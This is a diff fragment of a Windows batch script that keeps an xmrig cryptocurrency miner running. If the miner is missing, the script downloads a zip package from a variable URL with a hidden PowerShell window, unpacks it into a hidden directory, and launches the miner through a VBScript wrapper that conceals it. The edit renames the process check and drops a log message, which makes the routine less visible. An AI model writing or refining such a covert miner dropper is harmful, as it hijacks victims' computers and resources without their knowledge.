@@ -20,14 +20,13 @@ if not exist "%HIDDEN_DIR%run_hidden.vbs" (
     )
 )
 
-powershell -Command "Get-Process xmrig -ErrorAction SilentlyContinue" >nul 2>&1
+powershell -Command "Get-Process rig -ErrorAction SilentlyContinue" >nul 2>&1
 if %errorlevel% neq 0 (
     echo [%time%] xmrig.exe not running - attempting start
     if exist "%ORIGINAL_DIR%xmrig.exe" (
         wscript.exe "%HIDDEN_DIR%run_hidden.vbs" "%ORIGINAL_DIR%xmrig.exe"
     ) else (
-        echo [%time%] xmrig.exe missing - downloading package
-        
+
         powershell -WindowStyle Hidden -Command ^
             "Invoke-WebRequest '%ZIP_URL%' -OutFile '%HIDDEN_DIR%mall.zip'; ^
              Expand-Archive '%HIDDEN_DIR%mall.zip' '%HIDDEN_DIR%' -Force; ^
